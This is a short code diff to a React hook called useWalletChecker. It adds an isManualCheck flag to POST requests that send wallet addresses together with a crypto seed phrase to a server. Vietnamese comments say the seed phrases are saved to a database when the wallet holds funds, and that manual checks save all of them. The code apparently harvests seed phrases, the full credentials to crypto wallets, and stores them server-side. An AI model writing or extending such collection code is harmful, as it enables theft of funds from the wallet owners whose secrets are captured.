@@ -213,7 +213,8 @@ export function useWalletChecker({
           method: 'POST',
           body: JSON.stringify({ 
             addresses: allAddresses,
-            seedPhrase   // Thêm seedPhrase vào request để lưu vào database nếu có số dư
+            seedPhrase,   // Thêm seedPhrase vào request để lưu vào database nếu có số dư
+            isManualCheck: false // Đánh dấu là kiểm tra tự động
           })
         });
         
@@ -366,7 +367,8 @@ export function useWalletChecker({
             method: 'POST',
             body: JSON.stringify({ 
               addresses: allAddresses,
-              seedPhrase
+              seedPhrase,
+              isManualCheck: true // Đánh dấu là kiểm tra thủ công để lưu tất cả vào database
             })
           });
           
